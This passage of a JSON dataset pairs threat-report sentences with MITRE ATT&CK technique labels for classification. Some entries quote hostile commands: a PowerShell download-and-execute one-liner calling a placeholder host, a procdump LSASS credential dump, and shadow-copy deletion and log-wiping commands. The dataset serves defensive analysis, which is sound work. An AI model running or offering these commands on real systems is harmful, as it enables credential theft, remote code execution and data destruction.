    "type": "text",
    "text": "This requires either social engineering tactics to get the target to execute the malware or another program/script to execute the file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The use of shellcode, encoding, compression, obfuscated strings, process injection, hashing algorithms, domain fronting, different communication channels, and dynamically loaded libraries all give malware and network defenses a run for their money. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Dynamic analysis can get the malware to unpack, decode, or download additional stages.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Intezer Analyze result showing in-memory Cobalt Strike codeThe document drops and executes Cobalt Strike in the memory space of “rundll32.exe.”",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "TTPs section showing capabilities detected during executionThe document displays interesting techniques such as macros with auto-execution, network activity with a unique user agent, office process starting martian subprocess, and process injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Unlike the earlier SSH brute-forcing campaign, the plaintext credentials are embedded into the malware instead of being downloaded from the C2. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These credentials used appear to be default credentials for IoT devices.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "It attempts to specifically gain root access to these devices via a default password, despite having the same credentials in the list embedded in the binary. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This allows it to download and deploy a RapperBot payload of the correct architecture to ensure proper execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This selective behavior is more efficient than the shotgun approach in most IoT malware families, whereby all the binaries for the supported architectures are downloaded and executed in the victim's system. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If none of the software mentioned above is installed, it will extract and send an embedded binary downloader to the compromised device that executes and downloads the primary payload. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Here we can see how this code comparing the local IP address with a predefined list of network addresses typically associated with sandboxed environments.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "It uses the cpuinfo Python module to retrieve information about the CPU.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "if disk_size_gb > min_disk_size_gb: return False # Proceed else: return True # Not Proceed This code checks if the disk size is greater than a specified threshold (50 GB as example).",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It uses the win32api.",
    "command": "",
    "labels": [
      "T1082",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "GetDiskFreeSpaceEx() function to retrieve the disk size in bytes.",
    "command": "",
    "labels": [
      "T1082",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "These languages allow direct memory manipulation, access to system APIs, and the ability to write efficient and optimized code. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Attackers are using LNK files to download malware or other malicious files by leveraging legitimate native apps, such as PowerShell. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "For instance, this is a PowerShell one-liner that can be used to download and execute a remote .ps1 or .exe file: powershell \"IEX(New-Object Net.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WebClient).downloadString('http://IP:PORT/malicious.ps1')\" The .ps1 file could be a simple stager download of an .exe file and its execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "https://transfersh.com/WindowsUpdate Output: https://transfersh.com/XXXXXXXX/WindowsUpdate After one download the file will be deleted and link will returns a 404 error.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "ShellExecute($file) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This is a simple PowerShell script that downloads a file from a fixed location and executes it. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "$url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate' This line sets the value of the $url variable to the URL of the file to be downloaded. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This line uses the DownloadFile method of the WebClient object to download the file from the specified URL and save it to the specified local file path. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Application object provides methods for working with the Windows shell. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This line uses the ShellExecute method of the Shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Application object to execute the downloaded file. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The PE file is downloaded on filesystem and than executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "To enhance operational security, we can employ a clever alternative approach that eliminates the need to download files directly onto the victim’s computer: PE reflective injection. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Reflective PE injection Reflective PE injection is a technique used by malware or advanced attackers to inject a Portable Executable (PE) file directly into the memory of a running process without the need for writing the file to disk.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Unlike traditional injection methods, which involve loading an external DLL or injecting code into the target process, reflective PE injection allows the malware to load and execute its code directly from memory. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This technique is often employed to bypass security mechanisms that monitor or block external DLL loading or code injection. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In reflective PE injection, the PE file is parsed and its sections are reconstructed in the target process’s memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "By doing so, the injected code can appear as a legitimate part of the process, making it more difficult to detect and analyze. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once the PE file is injected and reconstructed in memory, the execution flow can be redirected to the injected code, enabling the malware to operate within the context of the compromised process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PowerSploit does provide a module called “Invoke-ReflectivePEInjection” that facilitates reflective PE injection using PowerShell.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This module allows the injection of a PE file into a remote or local process’s memory without writing it to disk, but being a well-known and widely-used tool, it has gained significant attention from security vendors and technologies, including the Antimalware Scan Interface (AMSI). ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it’s executing from a trusted, signed binary. ",
    "command": "",
    "labels": [
      "T1070.004",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "It is computed by hashing the following data: The physical address of the network interface The domain name of the device The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
    "command": "",
    "labels": [
      "T1012",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Like the domain, the URI is composed using a set of hardcoded keywords and paths, which are chosen partly at random and partly based on the type of HTTP request that is being sent out.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor accepts the following commands: Idle Exit SetTime CollectSystemDescription UploadSystemDescription RunTask GetProcessByDescription KillTask GetFileSystemEntries WriteFile FileExists DeleteFile GetFileHash ReadRegistryValue SetRegistryValue DeleteRegistryValue GetRegistrySubKeyAndValueNames Reboot None In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
    "command": "",
    "labels": [
      "T1005",
      "T1012",
      "T1057",
      "T1070.004",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The command CollectSystemDescription retrieves the following information: Local Computer Domain name Administrator Account SID HostName Username OS Version System Directory Device uptime Information about the network interfaces Resulting hands-on-keyboard attack Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
    "command": "",
    "labels": [
      "T1033",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "file], [various exports] With Rundll32, each compromised device receives a unique binary hash, unique local filesystem path, pseudo-unique export, and unique C2 domain. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "“After the victim’s machine is rebooted, the malicious Windows startup files run the payloads by sideloading them to the legitimate executables and downloading and executing two other PowerShell scripts from a different attacker-controlled server,” the blog post explained.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This trojan enables the attacker to monitor activity on a victim’s device by collecting system information such as hostnames, IPv4 addresses, OS version information, and insights on anti-virus software present on the machine.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "“The reconnaissance data is exfiltrated to the attacker-controlled server through an HTTP POST request,” Talos explained “The banking trojan targets the victim’s sensitive information, such as login credentials and financial transaction security codes, and logs keystrokes and manipulates the victim machine’s clipboard data.",
    "command": "",
    "labels": [
      "T1005",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "“The spam tool is a 32-bit DLL written in Delphi and, when run on the victim’s machine, will attempt to compromise the victim’s login credentials for webmail services such as Yahoo, Gmail, and Hotmail,” Cisco analysts explained.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once user credentials have been compromised, this tool takes “full control” of the account and begins creating and circulating spam emails to contacts found in the victim’s mailbox.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Hive actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments [T1566.001] and by exploiting the following vulnerabilities against Microsoft Exchange servers [T1190]: CVE-2021-31207 - Microsoft Exchange Server Security Feature Bypass Vulnerability CVE-2021-34473 - Microsoft Exchange Server Remote Code Execution Vulnerability CVE-2021-34523 - Microsoft Exchange Server Privilege Escalation Vulnerability After gaining access, Hive ransomware attempts to evade detention by executing processes to: Identify processes related to backups, antivirus/anti-spyware, and file copying and then terminating those processes to facilitate file encryption [T1562]. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or via PowerShell",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Prior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry [T1112]. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Table 2: Known IOCs as of November 2022 Known IOCs - Files HOW_TO_DECRYPT.txt typically in directories with encrypted files *.key typically in the root directory, i.e., C:\\ or /root hive.bat shadow.bat asq.r77vh0[.]pw - Server hosted malicious HTA file asq.d6shiiwz[.]pw - Server referenced in malicious regsvr32 execution asq.swhw71un[.]pw - Server hosted malicious HTA file asd.s7610rir[.]pw - Server hosted malicious HTA file Windows_x64_encrypt.dll Windows_x64_encrypt.exe Windows_x32_encrypt.dll Windows_x32_encrypt.exe Linux_encrypt Esxi_encrypt Known IOCs – Events System, Security and Application Windows event logs wiped Microsoft Windows Defender AntiSpyware Protection disabled Microsoft Windows Defender AntiVirus Protection disabled Volume shadow copies deleted Normal boot process prevented Known IOCs – Logged Processes wevtutil.exe cl system wevtutil.exe cl security wevtutil.exe cl application vssadmin.exe delete shadows /all",
    "command": "",
    "labels": [
      "T1057",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This could cause the file to run when double-clicked instead of opening it with a PDF viewer.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "OdicLoader drops a decoy PDF document, displays it using the system’s default PDF viewer (see Figure 2), and then downloads a second-stage backdoor from the OpenDrive cloud service.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The phishing emails contain links that redirect to a website hosted on a compromised server that prompts the victim to click on photo proof of their traffic violation.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "In clicking the photo, the victim unknowingly downloads a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s command and control (C2) server to download TrickBot to the victim’s system (Command and Scripting Interpreter:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Native API T1106 TrickBot uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "User Execution: Malicious File T1204.002 TrickBot has attempted to get users to launch malicious documents to deliver its payload. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Persistence [TA0003] Technique Title ID Use Scheduled Task/Job: Scheduled Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service T1543.003 TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots. Privilege Escalation",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Process Injection: Process Hollowing T1055.012 TrickBot injects into the svchost.exe process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows Service T1543.003 TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Modify Registry T1112 TrickBot can modify registry entries. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Impair Defenses: Disable or Modify Tools T1562.001 TrickBot can disable Windows Defender. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "[TA0006] Technique Title ID Use Input Capture: Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Unsecured Credentials: Credentials in Registry T1552.002 TrickBot has retrieved PuTTY credentials by querying the Software\\SimonTatham\\Putty\\Sessions registry key. Credentials from Password Stores T1555 TrickBot can steal passwords from the KeePass open-source password manager. Credentials from Password Stores: Credentials from Web Browsers T1555.003 TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "System Network Configuration Discovery T1016 TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "System Owner/User Discovery T1033 TrickBot can identify the user and groups the user belongs to on a compromised host. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "System Information Discovery T1082 TrickBot gathers the OS version, machine name, CPU type, amount of RAM available from the victim’s machine. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "File and Directory Discovery T1083 TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Collection [TA0009] Technique Tactic ID Use Data from Local System T1005 TrickBot collects local files and information from the victim’s local machine. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Input Capture:Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API. Person in the Browser T1185 TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified webpage. Command and Control",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Application Layer Protocol: Web Protocols T1071.001 TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Ingress Tool Transfer T1105 TrickBot downloads several additional files and saves them to the victim's machine. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Non-Standard Port T1571 Some TrickBot samples have used HTTP over ports 447 and 8082 for C2. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Symmetric Cryptography T1573.001 TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "searches for files that are 60mb and less and contain the following extensions: .doc .docx .xls .xlsx .ppt .pptx .exe .zip and .rar.  also runs the echo %APPDATA% command to list the contents of the directory.(Citation: Securelist Sofacy Feb 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy May 2019)  can obtain the current execution path as well as perform drive enumeration.(Citation: Accenture SNAKEMACKEREL Nov 2018) ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has registered two registry keys for shim databases.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors downloaded files and tools onto a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has been executed through user installation of an executable disguised as a flash installer.(Citation: ESET Bad Rabbit)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used tasklist /v to determine active process information.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "will attempt to enumerate Windows version and system architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collected information on user accounts via the whoami command.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to kill any running analysis processes and AV software.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to connect to a remote host in order to upload and download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "is downloaded using HTTP over port 443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "steals files with the following extensions: .docx .doc .pptx .ppt .xlsx .xls .rtf and .pdf.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP and HTTPS in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the external IP address of the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has collected information and files from a compromised machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "WMI Component",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Showing the Transfer of Cobalt Strike Beacons using RDPClip:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "and inject processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically: [HKLM and HKCU]\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\explorer Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect information about the about the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "of a Security Package into LSASS using RPC calls.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can use the command code do_vslist to send file names size and status to C2.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task.(Citation: Proofpoint Bumblebee April 2022)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "writes data into the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "creates a scheduled task to ensure it is re-executed everyday.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "malware gathers data from the local victim system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "shellcode is to inject the decrypted payload within the currently running process (itself).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can inject a variety of payloads into processes dynamically chosen by the adversary.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers.(Citation: JPCert BlackTech Malware September 2019)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can create a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to execute with WMIC.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "OS architecture (x86 or x64)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "(Source: Dell SecureWorks) Further research revealed additional tools containing the same username (see Figure 21)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can disable Microsoft Office Protected View by changing Registry keys.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can identify running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "c:\\windows\\temp\\procdump64.exe -accepteula -ma lsass.exe",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP POST requests for C2.(Citation: Cisco Talos Bitter Bangladesh May 2022)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "kills anti-virus found on the victim.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "copies itself into the %systemroot%\\system32 directory and registers as a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "If it is successful then it will send out basic host information and await further commands.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Recursive directory listing functions",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can modify registry keys including to enable or disable Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute commands on the victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has been known to use credential dumping using .",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "several POST requests",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has executed wget and curl commands to Pastebin over the HTTPS protocol.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use cmd.exe to run commands. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "checks for specific registry keys related to the UCOMIEnumConnections and IActiveScriptParseProcedure32 interfaces.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can collect the victim's computer name hostname and adapter information to create a unique identifier.(Citation: Securelist Dtrack)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can identify the user and groups the user belongs to on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows command shell to execute commands and batch scripting to automate execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has retrieved iPhone text messages from iTunes phone backup files.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "and enumerating files and drives",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "enticing users to click on malicious shortcut files",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "file was concealed beneath the \"open\" text which, if clicked, executed the HTA file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has added entries to the Registry for ransom contact information.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download an .exe and use process hollowing to inject it into a new process.(Citation: Forcepoint Monsoon)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Size Expansion of Configuration Information PlugX is designed to run based on its configuration information stored in itself",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The concatenated segments of base64 data from O7 get inserted into the Registry,",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "C :\\Windows\\system32\\cmd.exe /C shell whoami /all",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username from the victims machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "In the event it does, Reaver will move this file to ‘%TEMP%\\~FJIOW.tmp’ and delete this new file",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "obtains various system information including OS version, computer name and RAM size.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can collect the victim user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "collected the victim computer name OS version and architecture type and sent the information to its C2 server.  also enumerated all available drives on the victim's machine.(Citation: Cymmetria Patchwork)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "dispatcher can modify the Run registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can migrate the loader into another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "and a batch file 1.bat were dropped on the host and the batch file was executed",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used Android backdoors capable of enumerating specific files on the infected devices.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "sets the following registry entry to open the downloaded PDF file every time the computer boots",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks that run a VBScript to execute a payload on victim machines.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: FireEye APT34 July 2019)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
